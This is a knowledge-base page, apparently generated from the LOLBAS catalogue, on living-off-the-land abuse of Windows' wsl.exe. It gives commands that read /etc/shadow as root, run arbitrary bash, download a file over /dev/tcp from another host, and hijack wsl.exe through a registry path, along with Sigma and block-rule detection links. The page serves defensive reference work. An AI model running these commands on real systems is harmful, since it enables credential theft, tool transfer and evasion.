---
title: "Wsl.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Wsl.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml"
build_date: "2026-04-27 18:39:01"
category: "OtherMSBinaries"
aliases:
  - "Wsl.exe"
functions:
  - "Execute"
  - "Download"
attack_technique_ids:
  - "T1202"
  - "T1105"
  - "T1218"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Wsl.exe

Windows subsystem for Linux executable

## Metadata

- Category: OtherMSBinaries
- Created: 2019-06-27
- Author: Matthew Brown
- Source Path: yml/OtherMSBinaries/Wsl.yml

## Paths

- `C:\Windows\System32\wsl.exe`

## Commands

### 1. Execute

Executes calc.exe from wsl.exe

```cmd
wsl.exe -e /mnt/c/Windows/System32/calc.exe
```

- Use Case: Performs execution of specified file, can be used to execute arbitrary Linux commands.
- Privileges: User
- Operating System: Windows 10, Windows Server 2019, Windows 11
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]

### 2. Execute

Cats /etc/shadow file as root

```cmd
wsl.exe -u root -e cat /etc/shadow
```

- Use Case: Performs execution of arbitrary Linux commands as root without need for password.
- Privileges: User
- Operating System: Windows 10, Windows Server 2019, Windows 11
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]

### 3. Execute

Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`)

```cmd
wsl.exe --exec bash -c "{CMD}"
```

- Use Case: Performs execution of arbitrary Linux commands.
- Privileges: User
- Operating System: Windows 10, Windows Server 2019, Windows 11
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]

### 4. Download

Downloads file from 192.168.1.10

```cmd
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
```

- Use Case: Download file
- Privileges: User
- Operating System: Windows 10, Windows Server 2019, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

### 5. Execute

When executed, `wsl.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.

```cmd
wsl.exe
```

- Use Case: Execute a payload as a child process of `bash.exe` while masquerading as WSL.
- Privileges: User
- Operating System: Windows 10, Windows Server 2019, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wsl_lolbin_execution.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- IOC: Child process from wsl.exe

## Resources

- {'Link': 'https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules'}
- {'Link': 'https://twitter.com/nas_bench/status/1535431474429808642'}
- {'Link': 'https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/'}

## Acknowledgements

- {'Person': 'Alex Ionescu', 'Handle': '@aionescu'}
- {'Person': 'Matt', 'Handle': '@NotoriousRebel1'}
- {'Person': 'Asif Matadar', 'Handle': '@d1r4c'}
- {'Person': 'Nasreddine Bencherchali', 'Handle': '@nas_bench'}
- {'Person': "Konrad 'unrooted' Klawikowski"}
- {'Person': 'Liran Ravich, CardinalOps'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml)
